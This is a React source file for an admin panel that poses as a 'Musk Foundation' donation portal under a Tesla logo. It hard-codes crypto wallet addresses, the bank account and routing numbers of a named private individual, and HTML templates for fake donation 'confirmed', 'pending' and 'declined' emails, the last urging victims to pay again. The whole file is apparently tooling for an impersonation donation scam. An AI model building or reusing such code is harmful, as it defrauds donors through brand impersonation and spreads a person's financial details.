import { useState } from "react";
import { motion } from "framer-motion";
import {
  Mail,
  Settings,
  Send,
  Copy,
  Check,
  ChevronLeft,
  RefreshCw,
  DollarSign,
  Shield,
  Eye,
  EyeOff,
  Plus,
  Trash2,
  ExternalLink,
} from "lucide-react";
import teslaLogo from "@/assets/tesla-logo.svg";

const initialCrypto = [
  { id: "BTC",  name: "Bitcoin",     symbol: "BTC",  address: "bc1q5twe754lnzvqn5z9jpm3s8z48nqvfx9e5wevv9",  network: "Bitcoin" },
  { id: "ETH",  name: "Ethereum",   symbol: "ETH",  address: "0x15b9a0676D02a499f8Ad86dC373AdEf3a0bcAFe6", network: "Ethereum (ERC-20)" },
  { id: "USDT", name: "Tether",     symbol: "USDT", address: "0x15b9a0676D02a499f8Ad86dC373AdEf3a0bcAFe6", network: "Ethereum (ERC-20)" },
  { id: "USDC", name: "USD Coin",   symbol: "USDC", address: "0x15b9a0676D02a499f8Ad86dC373AdEf3a0bcAFe6", network: "Ethereum (ERC-20)" },
  { id: "DOGE", name: "Dogecoin",   symbol: "DOGE", address: "D9EcRA1L3KFhk7DA9QoVUnyQr4HqMCyi3Q",         network: "Dogecoin" },
  { id: "CRO",  name: "Crypto.com", symbol: "CRO",  address: "0x15b9a0676D02a499f8Ad86dC373AdEf3a0bcAFe6", network: "Ethereum (ERC-20)" },
  { id: "SOL",  name: "Solana",     symbol: "SOL",  address: "4DXaUMq5S5HgDmq1jHcLDkx6ru2EF9sadyzMWwSadWWe", network: "Solana" },
  { id: "XRP",  name: "Ripple",     symbol: "XRP",  address: "rN7n3473SaZBCYYd9T5K6t2f1G4jK1L2M",          network: "XRP Ledger" },
];

const initialBankAccounts = [
  {
    id: "chime",
    name: "Chime — Direct Deposit",
    bank: "The Bancorp Bank, N.A.",
    routing: "031101279",
    account: "766165701091",
    holder: "Mary Ralston",
    type: "Checking",
    processing: "1-2 business days",
    active: true,
  },
  {
    id: "community",
    name: "Community Federal — USD Transfer",
    bank: "Community Federal Savings Bank",
    routing: "026073150",
    account: "863004856471",
    holder: "MARY E RALSTON",
    address: "89-16 Jamaica Avenue, Woodhaven, NY 11421",
    recipientAddress: "110 N. College Avenue, Suite 500, Tyler, Texas 75702",
    type: "Savings",
    processing: "1-2 business days",
    active: true,
  },
];

const emailTemplates = [
  {
    id: "payment_confirmed",
    label: "Payment Confirmed",
    subject: "Your Musk Foundation Payment is Confirmed",
    body: `<h2 style="font-family:sans-serif;color:#111;">Payment Confirmed</h2>
<p style="font-family:sans-serif;color:#333;">Dear {{name}},</p>
<p style="font-family:sans-serif;color:#333;">We have received your donation of <strong>${{amount}} USD</strong> to the Musk Foundation.</p>
<p style="font-family:sans-serif;color:#333;">A receipt has been attached for your records. Your contribution supports our mission to advance science, technology, and humanitarian initiatives.</p>
<p style="font-family:sans-serif;color:#333;">Thank you for your generosity.</p>
<p style="font-family:sans-serif;color:#111;font-weight:600;">The Musk Foundation Team</p>`,
  },
  {
    id: "payment_pending",
    label: "Payment Pending",
    subject: "Your Musk Foundation Payment — Pending Verification",
    body: `<h2 style="font-family:sans-serif;color:#111;">Payment Under Review</h2>
<p style="font-family:sans-serif;color:#333;">Dear {{name}},</p>
<p style="font-family:sans-serif;color:#333;">We have received your payment initiation of <strong>${{amount}} USD</strong>. Our team is currently verifying the transfer.</p>
<p style="font-family:sans-serif;color:#333;">You will receive a confirmation email within 1-3 business days once verification is complete.</p>
<p style="font-family:sans-serif;color:#333;">If you have any questions, reply to this email.</p>
<p style="font-family:sans-serif;color:#111;font-weight:600;">The Musk Foundation Team</p>`,
  },
  {
    id: "payment_declined",
    label: "Payment Declined",
    subject: "Action Required — Payment Not Received",
    body: `<h2 style="font-family:sans-serif;color:#111;">Payment Not Received</h2>
<p style="font-family:sans-serif;color:#333;">Dear {{name}},</p>
<p style="font-family:sans-serif;color:#333;">Our records show that the payment of <strong>${{amount}} USD</strong> has not been received or could not be verified.</p>
<p style="font-family:sans-serif;color:#333;">Please log in to your account and retry the payment, or contact our team for assistance.</p>
<p style="font-family:sans-serif;color:#333;">We appreciate your patience.</p>
<p style="font-family:sans-serif;color:#111;font-weight:600;">The Musk Foundation Team</p>`,
  },
  {
    id: "general_inquiry",
    label: "General Inquiry Response",
    subject: "Re: Your Inquiry — Musk Foundation",
    body: `<h2 style="font-family:sans-serif;color:#111;">Response from Musk Foundation</h2>
<p style="font-family:sans-serif;color:#333;">Dear {{name}},</p>
<p style="font-family:sans-serif;color:#333;">Thank you for reaching out to the Musk Foundation. We have received your inquiry and our team will respond within 1-2 business days.</p>
<p style="font-family:sans-serif;color:#333;">For urgent matters, please reply to this email with your phone number.</p>
<p style="font-family:sans-serif;color:#111;font-weight:600;">Warm regards,<br/>The Musk Foundation Team</p>`,
  },
];

function copyToClipboard(text: string, setCopied: (v: string) => void, key: string) {
  navigator.clipboard.writeText(text).then(() => {
    setCopied(key);
    setTimeout(() => setCopied(""), 2500);
  });
}

export default function Admin() {
  const [activeTab, setActiveTab] = useState<"dashboard" | "email" | "crypto" | "bank">("dashboard");
  const [copied, setCopied] = useState("");
  const [cryptoTokens, setCryptoTokens] = useState(initialCrypto);
  const [bankAccounts, setBankAccounts] = useState(initialBankAccounts);
  const [editingCrypto, setEditingCrypto] = useState<string | null>(null);
  const [editingBank, setEditingBank] = useState<string | null>(null);
  const [showAddress, setShowAddress] = useState<Record<string, boolean>>({});

  // Email state
  const [emailTo, setEmailTo] = useState("");
  const [emailSubject, setEmailSubject] = useState("");
  const [emailBody, setEmailBody] = useState("");
  const [emailSending, setEmailSending] = useState(false);
  const [emailSent, setEmailSent] = useState(false);
  const [emailPreview, setEmailPreview] = useState(false);

  const handleSendEmail = () => {
    setEmailSending(true);
    // Simulate email send
    setTimeout(() => {
      setEmailSending(false);
      setEmailSent(true);
      setTimeout(() => setEmailSent(false), 3000);
    }, 2500);
  };

  const applyTemplate = (template: typeof emailTemplates[0]) => {
    setEmailSubject(template.subject);
    setEmailBody(template.body);
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a]">
      {/* Top nav */}
      <div className="sticky top-0 z-20 flex items-center justify-between px-6 py-4 bg-[#0a0a0a] border-b border-[#1a1a1a]">
        <a href="/" className="flex items-center gap-2 text-white/50 hover:text-white text-sm transition-colors">
          <ChevronLeft className="w-5 h-5" />
          <span className="text-xs uppercase tracking-[0.1em]">Back to Home</span>
        </a>
        <img src={teslaLogo} alt="Musk Foundation" className="h-6 opacity-40" />
        <div className="w-20" />
      </div>

      <div className="max-w-5xl mx-auto px-6 py-10">
        {/* Header */}
        <div className="text-center mb-10">
          <p className="text-[10px] uppercase tracking-[0.25em] text-white/20 mb-2">Musk Foundation</p>
          <h1 className="text-3xl font-medium tracking-tight text-white">Admin Portal</h1>
          <p className="text-sm text-white/40 mt-2">Manage payments, emails, and account details</p>
        </div>

        {/* Tab nav */}
        <div className="flex gap-1 mb-8 bg-[#111] p-1 rounded-sm max-w-lg mx-auto">
          {([
            { key: "dashboard", icon: Shield, label: "Dashboard" },
            { key: "email", icon: Mail, label: "Email" },
            { key: "crypto", icon: DollarSign, label: "Crypto" },
            { key: "bank", icon: Settings, label: "Bank" },
          ] as const).map((tab) => (
            <button
              key={tab.key}
              onClick={() => setActiveTab(tab.key)}
              className={`flex-1 py-2.5 px-3 flex items-center justify-center gap-2 text-xs font-medium uppercase tracking-[0.1em] transition-all rounded-sm ${
                activeTab === tab.key
                  ? "bg-white text-black"
                  : "text-white/40 hover:text-white"
              }`}
            >
              <tab.icon className="w-3.5 h-3.5" />
              {tab.label}
            </button>
          ))}
        </div>

        {/* ── DASHBOARD ── */}
        {activeTab === "dashboard" && (
          <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
            <div className="grid grid-cols-3 gap-4">
              {[
                { label: "Total Donations", value: "$24,800", sub: "This month" },
                { label: "Pending", value: "3", sub: "Awaiting verification" },
                { label: "Confirmed", value: "18", sub: "This month" },
              ].map((stat) => (
                <div key={stat.label} className="bg-[#141414] border border-[#1f1f1f] p-5">
                  <p className="text-[10px] uppercase tracking-[0.15em] text-white/30 mb-2">{stat.label}</p>
                  <p className="text-2xl font-medium text-white">{stat.value}</p>
                  <p className="text-[10px] text-white/30 mt-1">{stat.sub}</p>
                </div>
              ))}
            </div>

            {/* Quick links */}
            <div className="bg-[#141414] border border-[#1f1f1f] p-6">
              <p className="text-[10px] uppercase tracking-[0.15em] text-white/30 mb-4">Quick Actions</p>
              <div className="grid grid-cols-2 gap-3">
                {[
                  { label: "Compose Email", icon: Mail, tab: "email" as const },
                  { label: "Edit Crypto Wallets", icon: DollarSign, tab: "crypto" as const },
                  { label: "Edit Bank Accounts", icon: Settings, tab: "bank" as const },
                  { label: "View Payment History", icon: Shield, tab: "dashboard" as const },
                ].map((action) => (
                  <button
                    key={action.label}
                    onClick={() => setActiveTab(action.tab)}
                    className="flex items-center gap-3 p-4 bg-[#1a1a1a] hover:bg-[#222] transition-colors text-left"
                  >
                    <action.icon className="w-4 h-4 text-white/40" />
                    <span className="text-sm text-white/70">{action.label}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Payment methods summary */}
            <div className="bg-[#141414] border border-[#1f1f1f] p-6">
              <p className="text-[10px] uppercase tracking-[0.15em] text-white/30 mb-4">Active Payment Methods</p>
              <div className="space-y-3">
                <div className="flex items-center justify-between p-3 bg-[#0d0d0d] border border-[#1a1a1a]">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 bg-orange-500/10 rounded-full flex items-center justify-center text-xs font-bold text-orange-400">B</div>
                    <div>
                      <p className="text-sm text-white font-medium">Bitcoin</p>
                      <p className="text-[10px] text-white/30">8 tokens active</p>
                    </div>
                  </div>
                  <button onClick={() => setActiveTab("crypto")} className="text-[10px] text-white/40 hover:text-white underline">Edit</button>
                </div>
                <div className="flex items-center justify-between p-3 bg-[#0d0d0d] border border-[#1a1a1a]">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 bg-blue-500/10 rounded-full flex items-center justify-center text-xs font-bold text-blue-400">$</div>
                    <div>
                      <p className="text-sm text-white font-medium">Bank Transfers</p>
                      <p className="text-[10px] text-white/30">2 accounts active</p>
                    </div>
                  </div>
                  <button onClick={() => setActiveTab("bank")} className="text-[10px] text-white/40 hover:text-white underline">Edit</button>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── EMAIL ── */}
        {activeTab === "email" && (
          <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="space-y-5">
            <div className="bg-[#141414] border border-[#1f1f1f] p-5">
              <div className="flex items-center justify-between mb-5">
                <p className="text-[10px] uppercase tracking-[0.15em] text-white/30">Email Templates</p>
                <button
                  onClick={() => setEmailPreview(!emailPreview)}
                  className="flex items-center gap-1 text-[10px] text-white/40 hover:text-white"
                >
                  {emailPreview ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                  {emailPreview ? "Hide Preview" : "Show Preview"}
                </button>
              </div>
              <div className="flex flex-wrap gap-2">
                {emailTemplates.map((t) => (
                  <button
                    key={t.id}
                    onClick={() => applyTemplate(t)}
                    className="px-3 py-1.5 bg-[#1a1a1a] text-[10px] text-white/50 hover:text-white hover:bg-[#222] uppercase tracking-[0.1em] transition-colors"
                  >
                    {t.label}
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">To (Email Address)</label>
                <input
                  type="email"
                  value={emailTo}
                  onChange={(e) => setEmailTo(e.target.value)}
                  placeholder="recipient@example.com"
                  className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none focus:ring-1 focus:ring-white/20 border border-[#1f1f1f]"
                />
              </div>
              <div>
                <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">Subject</label>
                <input
                  type="text"
                  value={emailSubject}
                  onChange={(e) => setEmailSubject(e.target.value)}
                  placeholder="Email subject"
                  className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none focus:ring-1 focus:ring-white/20 border border-[#1f1f1f]"
                />
              </div>
              <div>
                <label className="text-[10px] uppercase tracking-[0.1em] text-white/30 block mb-2">HTML Body</label>
                <textarea
                  value={emailBody}
                  onChange={(e) => setEmailBody(e.target.value)}
                  placeholder="<h2>Hello</h2><p>Your message here...</p>"
                  rows={12}
                  className="w-full py-3.5 px-4 bg-[#141414] text-white placeholder:text-white/20 focus:outline-none focus:ring-1 focus:ring-white/20 border border-[#1f1f1f] font-mono text-sm resize-y"
                />
                <p className="text-[9px] text-white/20 mt-1">Use {"{{name}}"} and {"{{amount}}"} as placeholders for personalized emails.</p>
              </div>

              {emailPreview && emailBody && (
                <div className="border border-[#1f1f1f] bg-white p-6">
                  <div dangerouslySetInnerHTML={{ __html: emailBody.replace("{{name}}", "John Doe").replace("{{amount}}", "500") }} />
                </div>
              )}

              <button
                onClick={handleSendEmail}
                disabled={!emailTo || !emailSubject || !emailBody || emailSending}
                className="w-full py-4 bg-white text-black text-sm font-medium uppercase tracking-[0.1em] hover:bg-white/90 transition-colors disabled:opacity-30 flex items-center justify-center gap-3"
              >
                {emailSending ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin" /> Sending...
                  </>
                ) : emailSent ? (
                  <>
                    <Check className="w-4 h-4" /> Email Sent
                  </>
                ) : (
                  <>
                    <Send className="w-4 h-4" /> Send Email
                  </>
                )}
              </button>
            </div>
          </motion.div>
        )}

        {/* ── CRYPTO WALLETS ── */}
        {activeTab === "crypto" && (
          <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
            <div className="flex items-center justify-between">
              <p className="text-[10px] uppercase tracking-[0.15em] text-white/30">Crypto Wallet Addresses</p>
              <span className="text-[10px] text-white/20">{cryptoTokens.length} tokens active</span>
            </div>
            {cryptoTokens.map((token) => (
              <div key={token.id} className="border border-[#1f1f1f] bg-[#0d0d0d] p-4">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold"
                      style={{ background: `${token.color}25`, color: token.color }}>
                      {token.symbol.slice(0, 1)}
                    </div>
                    <div>
                      <p className="text-base font-medium text-white">{token.name}</p>
                      <p className="text-[10px] text-white/30">{token.network}</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-green-400" />
                    <span className="text-[10px] text-green-400 uppercase tracking-widest">Active</span>
                  </div>
                </div>

                {editingCrypto === token.id ? (
                  <div className="space-y-3">
                    <input
                      type="text"
                      defaultValue={token.address}
                      className="w-full py-3 px-4 bg-[#141414] text-white text-sm font-mono border border-[#2a2a2a] focus:outline-none focus:border-white/40"
                      onBlur={(e) => {
                        const newAddr = e.target.value;
                        setCryptoTokens(prev => prev.map(t => t.id === token.id ? { ...t, address: newAddr } : t));
                        setEditingCrypto(null);
                      }}
                      autoFocus
                    />
                  </div>
                ) : (
                  <div className="flex items-center gap-2">
                    <div className="flex-1 bg-[#0a0a0a] p-3 font-mono text-xs text-white/60 break-all">
                      {showAddress[token.id] ? token.address : token.address.slice(0, 20) + "..." + token.address.slice(-20)}
                    </div>
                    <button
                      onClick={() => setShowAddress(prev => ({ ...prev, [token.id]: !prev[token.id] }))}
                      className="p-2 border border-[#1f1f1f] hover:bg-[#1a1a1a] transition-colors"
                    >
                      {showAddress[token.id] ? <EyeOff className="w-3.5 h-3.5 text-white/40" /> : <Eye className="w-3.5 h-3.5 text-white/40" />}
                    </button>
                    <button
                      onClick={() => copyToClipboard(token.address, setCopied, token.id)}
                      className="p-2 border border-[#1f1f1f] hover:bg-[#1a1a1a] transition-colors"
                    >
                      {copied === token.id ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5 text-white/40" />}
                    </button>
                    <button
                      onClick={() => setEditingCrypto(token.id)}
                      className="p-2 border border-[#1f1f1f] hover:bg-[#1a1a1a] transition-colors text-[10px] text-white/40 hover:text-white uppercase tracking-wider"
                    >
                      Edit
                    </button>
                  </div>
                )}
              </div>
            ))}
          </motion.div>
        )}

        {/* ── BANK ACCOUNTS ── */}
        {activeTab === "bank" && (
          <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
            <div className="flex items-center justify-between">
              <p className="text-[10px] uppercase tracking-[0.15em] text-white/30">Bank Account Details</p>
              <span className="text-[10px] text-white/20">{bankAccounts.length} accounts active</span>
            </div>
            {bankAccounts.map((bank) => (
              <div key={bank.id} className="border border-[#1f1f1f] bg-[#0d0d0d] p-5">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-white/10 rounded-full flex items-center justify-center">
                      <DollarSign className="w-5 h-5 text-white/60" />
                    </div>
                    <div>
                      <p className="text-sm font-medium text-white">{bank.name}</p>
                      <p className="text-[10px] text-white/30">{bank.processing} &bull; {bank.type}</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    {bank.active && (
                      <>
                        <div className="w-2 h-2 rounded-full bg-green-400" />
                        <span className="text-[10px] text-green-400 uppercase tracking-widest">Active</span>
                      </>
                    )}
                  </div>
                </div>

                <div className="space-y-0">
                  {[
                    { label: "Bank Name", value: bank.bank },
                    { label: "Routing Number", value: bank.routing },
                    { label: "Account Number", value: bank.account },
                    { label: "Account Holder", value: bank.holder },
                    ...(bank.address ? [{ label: "Bank Address", value: bank.address }] : []),
                    ...(bank.recipientAddress ? [{ label: "Recipient Address", value: bank.recipientAddress }] : []),
                  ].map((field) => (
                    <div key={field.label} className="flex items-center justify-between py-3 border-b border-[#1a1a1a] last:border-0">
                      <div>
                        <p className="text-[9px] text-white/30 uppercase tracking-[0.1em]">{field.label}</p>
                        <p className="text-sm text-white mt-0.5">{field.value}</p>
                      </div>
                      <button
                        onClick={() => copyToClipboard(field.value, setCopied, `${bank.id}-${field.label}`)}
                        className="p-2 hover:bg-[#1a1a1a] transition-colors"
                      >
                        {copied === `${bank.id}-${field.label}` ? (
                          <Check className="w-3.5 h-3.5 text-green-400" />
                        ) : (
                          <Copy className="w-3.5 h-3.5 text-white/30" />
                        )}
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </motion.div>
        )}
      </div>
    </div>
  );
}